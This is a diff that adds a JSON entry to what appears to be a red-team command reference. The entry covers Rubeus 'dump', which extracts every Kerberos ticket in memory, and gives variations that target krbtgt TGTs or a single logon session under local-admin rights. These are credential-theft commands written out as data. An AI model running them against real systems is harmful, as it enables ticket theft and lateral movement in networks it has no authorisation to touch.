@@ -1,0 +1,17 @@
+{
+  "id": "rubeus-dump",
+  "name": "Rubeus dump",
+  "command": "Rubeus.exe dump /nowrap",
+  "description": "Extract every Kerberos ticket currently in memory across all logon sessions. Requires elevation for other users' tickets. /service:krbtgt narrows to TGTs; /luid:<id> targets one session.",
+  "platform": "windows",
+  "requires": ["local-admin"],
+  "protocols": ["kerberos"],
+  "tags": ["rubeus", "ticket-dump", "lsass"],
+  "variations": [
+    { "label": "TGTs Only", "requires": "local-admin", "command": "Rubeus.exe dump /service:krbtgt /nowrap" },
+    { "label": "Specific LUID", "requires": "local-admin", "command": "Rubeus.exe dump /luid:0x<luid> /nowrap" }
+  ],
+  "examples": [
+    "Rubeus.exe dump /service:krbtgt /nowrap"
+  ]
+}
